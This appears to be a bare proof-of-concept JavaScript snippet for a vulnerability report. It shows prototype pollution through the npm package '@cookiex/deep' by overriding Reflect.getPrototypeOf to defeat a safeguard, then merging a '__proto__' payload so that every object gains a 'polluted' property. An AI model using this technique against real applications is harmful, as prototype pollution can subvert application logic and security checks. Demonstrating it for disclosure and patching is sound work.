Reflect.getPrototypeOf = () => false;
const deep = require('@cookiex/deep');
console.log({}.polluted);
const target = {};
deep.default(target, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);